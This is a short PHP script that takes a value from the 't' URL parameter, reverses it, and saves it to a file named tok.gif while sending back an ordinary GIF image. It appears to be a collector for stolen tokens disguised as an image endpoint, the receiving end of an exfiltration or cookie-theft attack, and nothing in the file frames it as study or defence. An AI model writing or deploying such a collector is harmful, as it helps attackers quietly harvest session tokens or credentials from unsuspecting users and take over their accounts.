<?php
if (!empty($_GET["t"]))
{ 
$f = fopen("0.gif","rb");
$img = fread($f,filesize("0.gif"));
fclose($f);
$tokenn = $_GET['t'];
$f = fopen("tok.gif","w");
$tokenn = strrev($tokenn);
fwrite($f, $tokenn);
fclose($f);
header("Content-type: image/gif");
header("Content-Disposition: attachment; filename=t.gif");
echo $img;
}
